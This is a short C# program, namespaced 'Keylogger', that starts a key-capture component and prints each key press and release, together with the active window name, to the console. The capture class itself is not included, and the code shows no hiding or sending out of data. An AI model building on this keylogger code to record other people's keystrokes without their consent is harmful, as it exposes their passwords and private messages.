using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Keylogger
{
    class Program
    {
        static ManualResetEvent waitHandle = new ManualResetEvent(false);
        static void Main(string[] args)
        {
            Task CatherTask = Task.Factory.StartNew(() =>
            {
                Catcher catcher = new Catcher(20);
                catcher.KeyDown += KeyDown;
                catcher.KeyUp += KeyUp;
                catcher.Start();
            });
            waitHandle.WaitOne();
        }

        static void KeyDown(CatcherEventArgs args)
        {
            Console.WriteLine(args.WindowName);
            Console.WriteLine(args.UnicodeValue + " - Down");
        }

        static void KeyUp(CatcherEventArgs args)
        {
            Console.WriteLine(args.UnicodeValue + " - Up");
        }
    }
}
